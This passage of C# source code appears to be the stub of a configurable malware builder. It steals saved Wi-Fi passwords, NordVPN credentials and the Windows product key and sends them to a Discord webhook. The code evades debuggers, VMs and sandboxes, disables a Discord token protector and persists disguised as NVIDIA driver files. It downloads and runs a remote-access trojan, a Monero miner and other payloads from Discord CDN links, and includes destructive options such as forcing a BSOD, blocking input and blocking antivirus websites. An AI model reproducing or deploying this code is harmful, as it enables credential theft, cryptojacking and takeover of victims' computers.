			string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=" + profile + " key=clear | findstr Key");
			return output.Split(':').Last().Trim();
		}

		public static void ScanningNetworks()
		{
			string Stealer_Dir = Handler.ExploitDir;
			string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");
			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Wifi Network \n\n");
			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, output + "\n");
			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Wifi Network\n");
		}

		public static void SavedNetworks()
		{
			string Stealer_Dir = Handler.ExploitDir;
			string[] profiles = GetProfiles();
			foreach (string profile in profiles)
			{
				if (profile.Equals("65001"))
					continue;

				Counter.SavedWifiNetworks++;
				string pwd = GetPassword(profile);
				string fmt = "PROFILE: " + profile + "\nPASSWORD: " + pwd + "\n\n";

				File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Wifi Password \n\n");
				File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, fmt + "\n");
				File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Wifi Password\n");
			}
		}

	}
	#endregion

	static public class Protection
	{
		[DllImport("ntdll.dll")]
		internal static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		[DllImport("ntdll.dll")]
		internal static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		internal static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		internal static extern bool GetModuleHandleEx(UInt32 dwFlags, string lpModuleName, out IntPtr phModule);

		[DllImport("kernel32.dll")]
		internal static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

		[DllImport("kernel32.dll")]
		internal static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

		internal static void EraseSection(IntPtr address, int size)
		{
			IntPtr sz = (IntPtr)size;
			IntPtr dwOld = default(IntPtr);
			VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
			ZeroMemory(address, sz);
			IntPtr temp = default(IntPtr);
			VirtualProtect(address, sz, dwOld, ref temp);
		}

		public struct PE
		{
			static public int[] SectionTabledWords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
			static public int[] Bytes = new int[] { 0x1A, 0x1B };
			static public int[] Words = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
			static public int[] dWords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };
		}

		private static string _Id;
		private static int _UniqueSeed = 0;

		static private bool Valid(bool Exit, string[] _rootCaPublicKeys, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslpolicyerrors)
		{
			if (sslpolicyerrors != SslPolicyErrors.None) return false;

			var rootCertificate = SelfSignedCertificate(chain);
			var publicKey = Convert.ToBase64String(rootCertificate.PublicKey.EncodedKeyValue.RawData);
			var result = rootCertificate.Verify() && _rootCaPublicKeys.Contains(publicKey);
			if (!result && Exit)
				Environment.Exit(0);

			return result;
		}

		static private X509Certificate2 SelfSignedCertificate(X509Chain chain)
		{
			foreach (var x509ChainElement in chain.ChainElements)
			{
				if (x509ChainElement.Certificate.SubjectName.Name != x509ChainElement.Certificate.IssuerName.Name) continue;
				return x509ChainElement.Certificate;
			}
			throw new Exception("Self-signed certificate not found.");
		}

		static public void WebSniffers(bool Exit)
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

			HttpWebRequest.DefaultWebProxy = new WebProxy();
			WebRequest.DefaultWebProxy = new WebProxy();

			if (GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || GetModuleHandle("RestSharp.dll") != IntPtr.Zero || GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
			{
				if (Exit)
					Environment.Exit(0);
			}
		}

		static public void AntiDebug(bool Exit)
		{
			bool isDebuggerPresent = true;
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			if (isDebuggerPresent)
			{
				if (Exit)
					Environment.Exit(0);
			}
		}

		static public void Sandboxie(bool Exit)
		{
			if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
			{
				if (Exit)
					Environment.Exit(0);
			}
		}

		static public void Emulation(bool Exit)
		{
			long tickCount = Environment.TickCount;
			Thread.Sleep(500);
			long tickCount2 = Environment.TickCount;
			if (((tickCount2 - tickCount) < 500L))
			{
				if (Exit)
					Environment.Exit(0);
			}
		}

		static public void DetectVM(bool Exit)
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
					{
						if (Exit)
							Environment.Exit(0);
					}

			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					if (Exit)
						Environment.Exit(0);
				}
		}

		static public string DiskId()
		{
			if (!String.IsNullOrEmpty(_Id))
				return _Id;

			try
			{
				ManagementObject _Disk = new ManagementObject(@"win32_logicaldisk.deviceid=""c:""");
				_Disk.Get();

				_Id = _Disk["VolumeSerialNumber"].ToString();
			}
			catch { _Id = "9SB42HS"; }

			return DiskId();
		}

		static public int UniqueSeed()
		{
			if (_UniqueSeed != 0)
				return _UniqueSeed;

			DiskId();

			int seed = 0;
			foreach (char i in _Id)
				seed += (int)Char.GetNumericValue(i);

			_UniqueSeed = seed;
			return seed;
		}

		static public void AntiDump()
		{
			var process = Process.GetCurrentProcess();
			var base_address = process.MainModule.BaseAddress;
			var dwpeheader = Marshal.ReadInt32((IntPtr)(base_address + 0x3C));
			var wnumberofsections = Marshal.ReadInt16((IntPtr)(base_address + dwpeheader + 0x6));

			EraseSection(base_address, 30);

			for (int i = 0; i < PE.dWords.Length; i++)
				EraseSection((IntPtr)(base_address + dwpeheader + PE.dWords[i]), 4);

			for (int i = 0; i < PE.Words.Length; i++)
				EraseSection((IntPtr)(base_address + dwpeheader + PE.Words[i]), 2);

			for (int i = 0; i < PE.Bytes.Length; i++)
				EraseSection((IntPtr)(base_address + dwpeheader + PE.Bytes[i]), 1);

			int x = 0;
			int y = 0;

			while (x <= wnumberofsections)
			{
				if (y == 0)
					EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);

				EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + PE.SectionTabledWords[y]), 4);

				y++;

				if (y == PE.SectionTabledWords.Length)
				{
					x++;
					y = 0;
				}
			}
		}
	}


	#region VPN
	internal sealed class NordVPN
	{
		private static string Decode(string s)
		{
			try
			{
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				return "";
			}
		}

		// Save("NordVPN");
		public static void Save()
		{
			DirectoryInfo vpn = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
			if (!vpn.Exists)
				return;

			try
			{
				foreach (DirectoryInfo d in vpn.GetDirectories("NordVpn.exe*"))
					foreach (DirectoryInfo v in d.GetDirectories())
					{
						string userConfigPath = Path.Combine(v.FullName, "user.config");
						if (File.Exists(userConfigPath))
						{

							var doc = new XmlDocument();
							doc.Load(userConfigPath);

							string encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value").InnerText;
							string encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value").InnerText;

							if (encodedUsername != null && !string.IsNullOrEmpty(encodedUsername) &&
								encodedPassword != null && !string.IsNullOrEmpty(encodedPassword))
							{
								string username = Decode(encodedUsername);
								string password = Decode(encodedPassword);

								Counter.VPN++;
								string Stealer_Dir = Handler.ExploitDir;
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# NordVPN \n\n");
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "NordVPN\nUsername: " + username + "\nPassword: " + password + "\n\n");
								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of NordVPN\n");
							}


						}
					}
			}
			catch { }
		}

	}
	#endregion


	internal class Program
	{
		[DllImport("Kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("User32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

		private static string startupdir = Path.GetPathRoot(Assembly.GetEntryAssembly().Location) + "Users\\" + Environment.UserName + "\\AppData\\Local\\NVIDIA Local Drivers";
		public static void Startup()
		{
			if (!Directory.Exists(startupdir))
			{
				Directory.CreateDirectory(startupdir);
				File.SetAttributes(startupdir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
				File.Copy(Assembly.GetEntryAssembly().Location, startupdir + "\\DriversUpdateProcess_x64.exe");
				File.SetAttributes(startupdir + "\\DriversUpdateProcess_x64.exe", FileAttributes.Hidden | FileAttributes.System | FileAttributes.Hidden);
				Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				key.SetValue("nvidiaDValueOn", startupdir + "\\DriversUpdateProcess_x64.exe");
			}
		}

		// More adds
		public static readonly string ExecutablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
		public static void Error()
		{
			MessageBox.Show("messageError", "titleError", MessageBoxButtons.OK, MessageBoxIcon.Error);
		}

		public static void BSOD()
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

			System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
		}

		public static void KillTM()
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

			RegistryKey regkey;
			string keyValueInt = "1";
			string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			regkey = Registry.CurrentUser.CreateSubKey(subKey);
			regkey.SetValue("DisableTaskMgr", keyValueInt);
			regkey.Close();
		}

		public static void KillWebsites()
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

			string[] hostData = File.ReadAllLines(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts"));
			List<string> hostDataList = new List<string>(hostData);
			string youtube = "127.0.0.1" + " " + "www.youtube.com";
			string google = "127.0.0.1" + " " + "www.google.com";
			string facebook = "127.0.0.1" + " " + "www.facebook.com";
			string malware = "127.0.0.1" + " " + "www.malwarebytes.com";
			string instagram = "127.0.0.1" + " " + "www.instagram.com";
			string reddit = "127.0.0.1" + " " + "www.reddit.com";
			string avast = "127.0.0.1" + " " + "www.avast.com";
			string tiktok = "127.0.0.1" + " " + "www.tiktok.com";

			hostDataList.Add(youtube);
			hostDataList.Add(google);
			hostDataList.Add(facebook);
			hostDataList.Add(malware);
			hostDataList.Add(instagram);
			hostDataList.Add(reddit);
			hostDataList.Add(avast);
			hostDataList.Add(tiktok);

			string savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
			string[] hostDataArray = hostDataList.ToArray();
			File.WriteAllLines(savePath, hostDataArray);
		}

		public partial class Brrrrrr
		{
			[System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
			[return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
			public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

		}

		public static string MineStartDir
		{
			get
			{
				return System.Windows.Forms.Application.StartupPath;
			}
		}

		public static string MineStartPath
		{
			get
			{
				return System.Windows.Forms.Application.ExecutablePath;
			}
		}

		public enum DefendOptions
		{
			AntiWindows7 = 0,
		}

		public static void SetupDefend(DefendOptions dO)
		{
			try
			{
				if (dO == DefendOptions.AntiWindows7)
					ProcessSecure();
			}
			catch { }
		}

		[DllImport("Advapi32.dll")]
		private static extern bool SetKernelObjectSecurity(IntPtr Handle, SecurityInfos SecurityInformation, byte[] SecurityDescriptor);

		private static void ProcessSecure()
		{
			try
			{
				var sd = new RawSecurityDescriptor(ControlFlags.None, new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null), null, null, new RawAcl(2, 0));
				sd.SetFlags(ControlFlags.DiscretionaryAclPresent | ControlFlags.DiscretionaryAclDefaulted);
				var rawSd = new byte[sd.BinaryLength];
				sd.GetBinaryForm(rawSd, 0);
				if (!SetKernelObjectSecurity(Process.GetCurrentProcess().Handle, SecurityInfos.DiscretionaryAcl, rawSd))
					return;
			}
			catch { }
		}

		sealed class Protector
		{
			public string Directory { get; set; }
			public string Name { get; set; }
		}
		public partial class ScheduleTask
		{
			private string task_name;

			public ScheduleTask(string _task_name)
			{
				task_name = _task_name;
			}

			public void AddTask(string path)
			{
				try
				{
					Process cmd_proc = new Process
					{
						StartInfo = new ProcessStartInfo
					("cmd", "/C schtasks /create /tn \\" + task_name + "/tr" + path + "/st 00:00 /du 9999:59 /sc once /ri 1 /f")
					};
					cmd_proc.StartInfo.CreateNoWindow = true;
					cmd_proc.StartInfo.UseShellExecute = false;
					cmd_proc.Start();
				}
				catch { }
			}

			public override string ToString()
			{
				return task_name;
			}
		}

		public static void DownloadFile(string url, string file_save)
		{
			try
			{
				new WebClient().DownloadFile(url, file_save);
			}
			catch { }
		}

		public static void DeleteMe()
		{
			try
			{
				ProcessStartInfo Flash = new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + (new FileInfo((new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				};
				Process.Start(Flash).Dispose();
				Process.GetCurrentProcess().Kill();
			}
			catch { }
		}

		private static string ratURL = "%raturlrightthere%";
		private static string EEEEEappdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Thanks to Sp00p64
		public static void RunRAT()
		{
			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
			{
				Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
			}

			try
			{
				new WebClient().DownloadFile(ratURL, EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordRAT.exe");
			}
			catch { }

			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordRAT.exe");
		}

		private static string minePool = "%poolhere%";
		private static string mineUser = "%usernamehere%";
		private static string mine_cpu_usage = "%usagehere%";
		private static string minePassword = "%passwordhere%";

		// Thanks to Alexuiop1337
		public static void RunMonero()
		{
			try
			{
				const string download_link = "https://cdn.discordapp.com/attachments/831225076187660348/902512908485935114/shost.exe";
				new WebClient().DownloadFile(download_link, MineStartDir + "\\shost.exe");
			}
			catch { }

			string Pool = minePool;
			string user = mineUser;
			string cpu_usage = mine_cpu_usage;
			string password = minePassword;
			try
			{
				Process moneProcs = new Process();
				moneProcs.StartInfo.CreateNoWindow = true;
				moneProcs.StartInfo.UseShellExecute = false;
				moneProcs.StartInfo.Arguments = string.Format("--url={0} --user={1} --pass={4} --threads 5 --donate-level=1 " +
						"--keepalive --retries=5 --max-cpu-usage={3}", Pool, user, "0x3", cpu_usage, password);
				moneProcs.StartInfo.FileName = MineStartDir + "\\runtime-servece.exe";

				if (!MineStartDir.Contains(Environment.GetEnvironmentVariable("LocalAppData")))
				{
					try
					{
						string drop_folder = Environment.GetEnvironmentVariable("ProgramData") + "\\MSOSecurity";
						if (Directory.Exists(drop_folder))
							return;
						Directory.CreateDirectory(drop_folder);
						File.Copy(MineStartPath, drop_folder + "\\Streamm.exe");
						File.SetAttributes(drop_folder + "\\Streamm.exe", FileAttributes.Hidden | FileAttributes.System);
						File.SetAttributes(drop_folder, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
						Process.Start(drop_folder + "\\Streamm.exe");
						DeleteMe();
					}
					catch { }
				}
				else
				{
					SetupDefend(DefendOptions.AntiWindows7);

					new ScheduleTask("Windows_launcher").AddTask(MineStartPath);

					if (!File.Exists(MineStartDir + "\\shost.exe"))
					{
						var xxx = File.ReadAllBytes(MineStartDir + "\\shost.exe");

						if (!File.Exists(MineStartDir + "\\runtime-servece.exe"))
							File.WriteAllBytes(MineStartDir + "\\runtime-servece.exe", xxx);
					}

					moneProcs.Start();
				}
			}
			catch { }
		}

		public static void RunWizard()
		{
			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
			{
				Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
			}

			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973553916992176208/DiscordTools.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
			}
			catch { }
			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
		}

		public static void RunDesudo()
		{
			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
			{
				Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
			}

			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973552633203810344/fakeDesudo.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
			}
			catch { }
			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
		}

		public static void RunFAKEcmd()
		{
			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
			{
				Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
			}

			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973552465335164928/FakeConsole.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
			}
			catch { }
			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
		}

		public static void RunFAKENitroGEN()
		{
			if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
			{
				Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
			}

			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973552775315226635/nitrogen.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
			}
			catch { }
			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
		}


		public static void BlockInput()
		{
			Brrrrrr.BlockInput(true);
		}

		public static void StealWIFI()
		{
			Wifi.SavedNetworks();
			Wifi.ScanningNetworks();
		}

		public static void HideFile(string path = null)
		{
			string filename = path;
			if (path == null) filename = ExecutablePath;
			new FileInfo(filename).Attributes |= FileAttributes.Hidden;
		}

		public static void KillWIFI()
		{
			ProcessStartInfo internet = new ProcessStartInfo()
			{
				FileName = "cmd.exe",
				Arguments = "/C ipconfig /release",
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process.Start(internet);
		}

		public static void Jumpscare()
		{
			Process.Start("https://www.youtube.com/watch?v=rX7XZLcGAxw&ab_channel=UnlockedInfantry");
		}


		public static void CustomPlugin()
		{
			//%customcodehere%;
		}

		public static void TakePicture()
		{
			dPictures.Piccc();
		}

		public static void WinProductKey()
		{
			string Stealer_Dir = Handler.ExploitDir;
			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Windows Key \n\n");
			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "Win Key: " + ProductKey.GetWindowsProductKeyFromRegistry() + " | \n");
			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Win Key \n");
		}

		public static Random randewigoewigj = new Random();
		static string genMeName(int length)
		{
			string c = "";
			string alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			for (int x = 0; x < length; x++)
			{
				c += alph[randewigoewigj.Next(0, alph.Length - 1)];
			}
			return c;
		}

		public static void ExtractSaveResource(String filename, String location)
		{
			System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
			Stream resFilestream = a.GetManifestResourceStream(filename);
			if (resFilestream != null)
			{
				BinaryReader br = new BinaryReader(resFilestream);
				FileStream fs = new FileStream(location, FileMode.Create); // say 
				BinaryWriter bw = new BinaryWriter(fs);
				byte[] ba = new byte[resFilestream.Length];
				resFilestream.Read(ba, 0, ba.Length);
				bw.Write(ba);
				br.Close();
				bw.Close();
				resFilestream.Close();
			}
		}

		private static bool embedOne = %otutajembedone%;
		private static bool embedTwo = %otutajembedtwo%;
		private static bool embedThree = %otutajembedthree%;
		private static bool embedFour = %otutajembedfour%;
		private static bool embedFive = %otutajembedfive%;

		public static void BypassProtectors()
		{
			List<Protector> protectors = new List<Protector>()
			{
				new Protector()
				{
					Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
					Name = "DiscordTokenProtector"
				},
				new Protector()
				{
					Directory = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\DTP_WindowsInstaller",
					Name = "DiscordTokenProtector"
				},
			};

			bool mamem = false;
			foreach (var protector in protectors)
			{
				var process = Process.GetProcessesByName(protector.Name);
				if (process.Length > 0)
				{
					mamem = true;
					foreach (var proc in process)
					{
						try { proc.Kill(); }
						catch (Exception ex)
						{
							if (ex.Message.Contains("Access"))
							{
								if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
								{
									using (Process newProc = new Process())
									{
										while (true)
										{
											try
											{
												newProc.StartInfo.FileName = Application.ExecutablePath;
												newProc.StartInfo.CreateNoWindow = true;
												newProc.StartInfo.UseShellExecute = true;
												newProc.StartInfo.Verb = "runas";
												newProc.Start();

												break;
											}
											catch (Exception)
											{ continue; }
										}
									}
								}
							}
						}

						try
						{
							if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
								Environment.Exit(0);

							string MainModulePath = protector.Directory;
							if (!Directory.Exists(MainModulePath))
								continue;

							Thread.Sleep(100);
							if (File.Exists(protector.Directory + "\\" + protector.Name + ".exe"))
								File.Delete(protector.Directory + "\\" + protector.Name + ".exe");


						}
						catch (Exception ex)
						{
							File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
							continue;
						}
					}

				}
				if (mamem)
				{
					var DiscordProcs = Process.GetProcessesByName("Discord");
					foreach (var proc in DiscordProcs)
						try { proc.Kill(); } catch { }

					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
				}
			}
		}

		private static void Main(string[] args)
		{

			string filenameSpacer = Environment.UserName;
			hisName.howtonameit = filenameSpacer + "_" + genMeName(12) + ".dAIO";

			Protection.WebSniffers(%sniffersyesno%);
			Protection.AntiDebug(%debugyesno%);
			Protection.DetectVM(%vmyesno%);
			Protection.Sandboxie(%sandboxyesno%);
			Protection.Emulation(%emuyesno%);

			WebClient webClient = new WebClient();
			string ip = webClient.DownloadString("http://checkip.dyndns.org");
			ip = ip.Substring(ip.IndexOf(":"));
			ip = ip.Replace(": ", "");
			ip = ip.Substring(0, ip.IndexOf("<") + 1);
			ip = ip.Replace("<", "");

			BypassProtectors();

			//startupaio
			//hideme
			//errorhere

			Discord.WriteDiscord();

			// Some mac adress new method
			//string macString = macAddr.ToString();

			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Main informations \n");
			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nDesktop name: " + Environment.UserName + " | \n");
			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "IP Address: " + ip + " | \n");
			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Main informations \n");

			//File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Additional informations \n");
			//File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nMAC Address: " + macString + " | \n");
			//File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Additional informations \n");

			//stealpasses
			//stealcookies
			//stealhistory
			//stealcreditcard

			//winkey

			//stealnord

			//stealwifi

			//jumpscare

			string myColor = %selectedColor%.ToString();
			string messageToEmbed =
				"```diff" +
				"\nNew report ⚠\n" +
				"\n-  Username: " + Environment.UserName +
				"\n-  PC Name: " + Environment.MachineName +
				"\n-  IP Address: " + ip +
				"\n```";

			string fileformat = "dAIO";
			string filepath = Handler.ExploitDir + "\\" + hisName.howtonameit;
			string application = "";

			try
			{
				DiscordWebhook.SendFile(messageToEmbed, hisName.howtonameit, fileformat, filepath, application);
			}
			catch
			{
				DiscordWebhook.Send("Report size is more then 8 MB. Sending isn`t available.");
			}

			//takepic

			//custom

			//ourcoolfakecmd
			//ourcoolfakenitrogen
			//ourcoolfakesetup
			//fakedesexe

			if (embedOne)
			{
				try
				{
					ExtractSaveResource("emExe1.exe", Application.StartupPath + "\\emExe1.exe");
					Process.Start("emExe1.exe");
				}
				catch { }
			}
			if (embedTwo)
			{
				try
				{
					ExtractSaveResource("emExe2.exe", Application.StartupPath + "\\emExe2.exe");
					Process.Start("emExe2.exe");
				}
				catch { }
			}
			if (embedThree)
			{
				try
				{
					ExtractSaveResource("emExe3.exe", Application.StartupPath + "\\emExe3.exe");
					Process.Start("emExe3.exe");
				}
				catch { }
			}
			if (embedFour)
			{
				try
				{
					ExtractSaveResource("emExe4.exe", Application.StartupPath + "\\emExe4.exe");
					Process.Start("emExe4.exe");
				}
				catch { }
			}
			if (embedFive)
			{
				try
				{
					ExtractSaveResource("emExe5.exe", Application.StartupPath + "\\emExe5.exe");
					Process.Start("emExe5.exe");
				}
				catch { }
			}


			//ratoverhere

			//sneakyminer

			//killinput
			//killweb
			//killctrlaltdel
			//killdefender
			//killinternet
			//bsodlmao

			KYS();
		}

		static void KYS()
		{
			Thread.Sleep(5000);
			Process.Start(new ProcessStartInfo()
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath +"\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(0);
		}
	}
}